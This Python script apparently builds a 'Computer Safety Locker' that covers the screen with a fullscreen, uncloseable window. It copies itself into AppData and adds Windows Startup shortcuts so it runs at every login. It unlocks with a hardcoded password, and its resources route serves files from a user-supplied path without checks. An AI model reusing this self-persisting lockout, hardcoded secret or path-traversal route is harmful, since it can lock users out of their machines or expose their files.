import os
import shutil
import webview
import subprocess
import win32com.client
from flask import Flask, send_file, request, redirect, url_for
 
app = Flask(__name__)

def create_shortcut():
    source_file = __file__
    destination_location = os.path.join(os.path.expanduser("~"), "AppData")
    startup_shortcut_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "Computer Safety Locker.lnk")
    programs_shortcut_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Computer Safety Locker.lnk")

    if os.name == 'nt':
        shutil.copy(source_file, destination_location)
        shell = win32com.client.Dispatch("WScript.Shell")
        for shortcut_path in [startup_shortcut_path, programs_shortcut_path]:
            if not os.path.exists(shortcut_path):
                shortcut = shell.CreateShortCut(shortcut_path)
                shortcut.TargetPath = source_file
                shortcut.IconLocation = "templates\\saftey.ico"
                shortcut.save()
    else:
        print("Shortcut creation is only supported on Windows.")

def shutdown():
    if os.name == 'nt':
        subprocess.call(['shutdown', '/s', '/t', '0'])
    else:
        os.system('shutdown -h now')

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == 'nexus':
            return redirect(url_for('success'))
        else:
            return redirect(url_for('failure'))
    return send_file('templates/index.html')

@app.route('/success')
def success():
    return send_file('templates/success.html')

@app.route('/failure')
def failure():
    return send_file('templates/failure.html')

@app.route('/closeApp', methods=['GET'])
def close_app():
    locker.destroy()
    return 'Success', 200

@app.route('/resources/<path>')
def resources(path):
    return send_file(os.path.join('templates', path))

if __name__ == "__main__":
    locker = webview.create_window("Computer Safety Locker", app, frameless=True, resizable=False, fullscreen=True, draggable=False, zoomable=False, http_port=3000)
    create_shortcut()
    locker.set_window_closable = False

    webview.start()